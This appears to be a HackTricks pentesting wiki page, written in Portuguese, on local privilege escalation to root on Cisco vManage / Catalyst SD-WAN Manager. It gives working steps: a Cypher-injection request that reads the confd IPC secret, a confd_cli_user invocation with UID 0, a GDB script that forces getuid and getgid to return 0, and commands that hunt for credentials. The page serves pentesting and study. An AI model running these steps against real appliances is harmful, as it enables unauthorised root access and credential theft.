# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Uma vez que você tenha execução de código no Cisco vManage / *Catalyst SD-WAN Manager* como `vmanage`, `netadmin` ou `vmanage-admin`, as superfícies locais de privesc mais interessantes geralmente são a stack de CLI `confd`, o helper `cmdptywrapper`, as APIs REST em localhost e os handlers de import/upload propriedade de root.

Se você ainda precisar do **initial foothold** em um controller, confira primeiro a página dedicada à control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
```
Se `/etc/confd/confd_ipc_secret` for legível a partir do seu foothold, Path 1 e Path 2 tornam-se imediatamente viáveis.

## Path 1

(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Após investigar um pouco algumas [documentation](http://66.218.245.39/doc/html/rn03re18.html) relacionadas ao `confd` e aos diferentes binaries (acessíveis com uma conta no site da Cisco), descobrimos que, para autenticar o socket IPC, ele usa um secret localizado em `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Lembra da nossa instância Neo4j? Ela está sendo executada sob os privilégios do usuário `vmanage`, permitindo assim recuperar o arquivo usando a vulnerabilidade anterior:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
O programa `confd_cli` não suporta argumentos de linha de comando, mas chama `/usr/bin/confd_cli_user` com argumentos. Então, podemos chamar diretamente `/usr/bin/confd_cli_user` com nosso próprio conjunto de argumentos. No entanto, ele não é legível com nossos privilégios atuais, então temos que recuperá-lo do rootfs e copiá-lo usando scp, ler a ajuda e usá-lo para obter o shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Exemplo de [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

O blog¹ da equipe synacktiv descreveu uma forma elegante de obter um root shell, mas o detalhe é que isso exige obter uma cópia de `/usr/bin/confd_cli_user`, que só pode ser lido por root. Encontrei outra maneira de escalar para root sem esse transtorno.

Quando descompilei o binário `/usr/bin/confd_cli`, observei o seguinte:

<details>
<summary>Objdump mostrando coleta de UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Ao executar “ps aux”, observei o seguinte (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Eu hipotetizei que o programa “confd_cli” passa o user ID e group ID que ele coletou do usuário autenticado para a aplicação “cmdptywrapper”.

Minha primeira tentativa foi executar o “cmdptywrapper” diretamente e fornecer `-g 0 -u 0`, mas falhou. Parece que um file descriptor (-i 1015) foi criado em algum ponto do processo e eu não consigo falsificá-lo.

Como mencionado no blog da synacktiv (last example), o programa `confd_cli` não suporta command line argument, mas eu posso influenciá-lo com um debugger e, felizmente, o GDB está incluído no sistema.

Criei um script de GDB no qual forcei a API `getuid` e `getgid` a retornarem 0. Como eu já tenho privilégio “vmanage” por meio do deserialization RCE, tenho permissão para ler diretamente o `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Saída do console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

A Cisco posteriormente documentou um caminho local mais limpo para root em seu próprio advisory para [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): um **atacante autenticado com apenas privilégios read-only** poderia enviar uma request forjada ao CLI do manager e chegar a root por causa de validação de input insuficiente.

Do ponto de vista ofensivo, este é o ponto principal:

1. Assim que você tiver *qualquer* foothold de baixo privilégio na máquina, você deve testar o serviço local de CLI antes de partir para o workflow mais pesado do Path 1 / Path 2.
2. Reutilize os artifacts do Path 2 para encontrar a trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Trate cada campo encaminhado ao backend do CLI como suspeito: UID/GID, username, terminal metadata, imported files, ou qualquer valor consumido depois por um helper owned by root.
4. Se um usuário de baixo privilégio puder alcançar o socket local do CLI e influenciar esses campos, root pode estar a apenas uma request forjada de distância.

Um workflow prático após obter acesso ao appliance é:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Isso transforma o bug de 2025 em um bom padrão de hunting para versões semelhantes: procure por **local CLI shims que coletam identidade em userland e a encaminham para um wrapper mais privilegiado**.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

O advisory da Cisco de fevereiro de 2026 também introduziu outra classe útil de privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) permitia que um **attacker local autenticado com low privileges** obtivesse root por causa de um mecanismo de user-authentication insuficiente na REST API.

Isso importa porque a privesc do vManage não se limita mais ao abuso de `confd`/TTY. Depois de obter uma shell com low-priv, também procure por:

- endpoints de API apenas para localhost que confiam demais no caller
- tokens, cookies ou service credentials legíveis a partir da conta atual
- ações apenas de root expostas por handlers `dataservice`/REST que ainda podem ser acionadas localmente

Na prática, depois que você tem uma shell como `vmanage` ou outro service user, o abuso local da API muitas vezes é mais silencioso e mais fácil de automatizar do que o abuso interativo da CLI:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Se a sessão local tiver contexto suficiente para atingir funcionalidades REST privilegiadas, prefira o caminho da API: é mais fácil de reproduzir, automatizar e encadear com sessões web roubadas ou tokens de API.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Outro padrão recente é [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): um atacante local com privilégios `netadmin` podia fazer upload de um **crafted file** que depois era tratado de forma insegura pela CLI, levando a command injection como `root`.

Do ponto de vista do HackTricks, a técnica valiosa é mais ampla do que o CVE específico:

1. Enumere cada workflow de CLI ou web que aceite um arquivo: imports, diagnostic bundles, templates, validators, backups, tenant data, etc.
2. Rastreie onde o arquivo enviado vai parar e qual script ou binário executado por root o consome.
3. Teste se o nome do arquivo, o conteúdo do arquivo ou metadados analisados são algum dia passados para shell commands, wrapper scripts ou helpers no estilo `system()`.
4. Se você já consegue chegar a `netadmin` (credenciais válidas, sessão roubada ou uma cadeia de auth-bypass), bugs de file-processing costumam ser o caminho mais rápido para root.

Essa classe de bug faz chain especialmente bem com footholds remotos que concedem `netadmin`, mas não `root`.

## Outras vulns recentes do vManage/Catalyst SD-WAN Manager para chain

- **Authenticated UI XSS (CVE-2024-20475)** – Roube uma sessão de admin na web UI e depois pivote para ações na API/CLI que eventualmente chegam a `vshell` ou a um dos caminhos locais de privesc acima.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Pré-requisito muito forte para Path 5, porque `netadmin` é exatamente o nível exigido pela privesc de crafted-file de 2026.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Útil para soltar arquivos que depois sejam processados por componentes privilegiados ou para sobrescrever artefatos operacionais consumidos por helpers executados por root.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Melhor documentado na página dedicada de control-plane do SD-WAN; ele pode anexar uma SSH key para `vmanage-admin`, dando o foothold local necessário para revisitar esta página.

## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)

{{#include ../../banners/hacktricks-training.md}}
